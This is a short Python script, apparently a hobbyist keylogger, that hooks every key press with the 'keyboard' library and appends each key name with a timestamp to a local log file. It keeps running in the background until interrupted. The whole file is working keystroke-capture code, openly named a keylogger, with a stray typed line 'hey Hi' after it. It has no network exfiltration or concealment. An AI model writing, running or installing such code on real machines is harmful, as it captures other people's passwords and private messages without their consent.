import keyboard
import time

# Specify the log file path (change as needed)
log_file = "F:\\VScode\\key logger\\logs.txt"


def on_press(event):
    try:
        # Filter out special keys (you can customize this section)
        if event.name in ["esc", "delete", "tab"]:
            return

        # Log the key with timestamp
        with open(log_file, "a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}: {event.name}\n")

    except Exception as e:
        print(f"Error: {e}")

# Start the listener
keyboard.on_press(on_press)

# Keep the program running in the background
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Keylogger stopped.")
    keyboard.unhook_all()
except Exception as e:
    print(f"Error: {e}")
finally:
    keyboard.unhook_all()
hey Hi